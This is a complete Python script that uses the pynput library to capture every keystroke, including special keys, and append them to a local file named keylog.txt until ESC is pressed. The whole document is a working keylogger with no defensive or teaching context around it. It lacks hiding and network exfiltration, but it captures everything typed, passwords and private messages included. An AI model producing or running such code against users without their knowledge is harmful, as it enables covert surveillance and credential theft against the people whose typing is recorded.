from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        if key == key.space:
            with open(log_file, "a") as file:
                file.write(" ")
        elif key == key.enter:
            with open(log_file, "a") as file:
                file.write("\n")
        else:
            with open(log_file, "a") as file:
                file.write(f" {str(key)} ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def main():
    print("Starting keylogger... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()